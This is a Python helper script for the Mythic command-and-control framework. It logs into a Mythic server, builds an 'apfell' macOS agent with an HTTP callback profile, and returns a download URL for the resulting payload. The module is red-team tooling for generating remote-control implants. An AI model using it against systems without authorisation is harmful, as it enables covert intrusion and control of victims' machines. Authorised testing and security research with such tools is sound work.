import logging

from mythic import mythic
from Settings.MythicSettings import *
import shutil


async def login_mythic(logging_level: int = logging.WARNING) -> mythic.mythic_classes.Mythic:
    return await mythic.login(
        username=mythic_username,
        password=mythic_password,
        server_ip=mythic_server_ip,
        server_port=mythic_server_port,
        ssl=mythic_ssl,
        logging_level=logging_level
    )


async def create_apfell_payload(
        mythic_instance: mythic.mythic_classes.Mythic,
        description: str,
        filename: str,
        commands: list[str] = None,
        include_all_commands: bool = False
) -> dict:
    return await mythic.create_payload(mythic=mythic_instance,
                                       payload_type_name="apfell",
                                       c2_profiles=[
                                           {
                                               "c2_profile": "http",
                                               "c2_profile_parameters": {
                                                   "callback_host": mythic_http_callback_host,
                                                   "callback_interval": mythic_http_callback_interval,
                                                   "callback_port": mythic_http_callback_port}
                                           }
                                       ],
                                       description=description,
                                       operating_system="macOS",
                                       # if we want to only include specific commands, put them here:
                                       # commands=["cmd1", "cmd2", "cmd3"],
                                       commands=commands,
                                       include_all_commands=include_all_commands,
                                       return_on_complete=True,
                                       filename=filename)


async def login_and_create_apfell(
        description: str,
        filename: str,
        commands: list[str] = None,
        include_all_commands: bool = False,
        logging_level: int = logging.WARNING
) -> dict:
    print("[+] Logging into Mythic")
    mythic_instance = await login_mythic(logging_level=logging_level)
    print("[+] Creating new apfell payload")
    payload = await create_apfell_payload(mythic_instance=mythic_instance,
                                          description=description,
                                          filename=filename,
                                          commands=commands,
                                          include_all_commands=include_all_commands)
    if payload["build_phase"] == "success":
        return await get_payload_data(mythic_instance=mythic_instance, payload_uuid=payload["uuid"])
    else:
        raise Exception(f"{payload['build_stderr']}\n{payload['build_message']}")


async def get_payload_data(mythic_instance: mythic.mythic_classes.Mythic,
                           payload_uuid: str) -> dict:
    return await mythic.get_payload_by_uuid(mythic=mythic_instance,
                                            payload_uuid=payload_uuid)


async def get_payload_download_url(payload_info: dict) -> str:
    payloadDownloadid = payload_info["filemetum"]["agent_file_id"]
    url = "https://" + mythic_server_ip + ":" + mythic_server_port + "/direct/download/" + payloadDownloadid
    return url


def copyanything(src, dst):
    try:
        shutil.copytree(src, dst)
        print("[+] Copied Template Folder to '% s'" % dst)
    except OSError as error:
        shutil.rmtree(dst)
        shutil.copytree(src, dst)
        print("[+] Overwrote files '%s'" % dst)
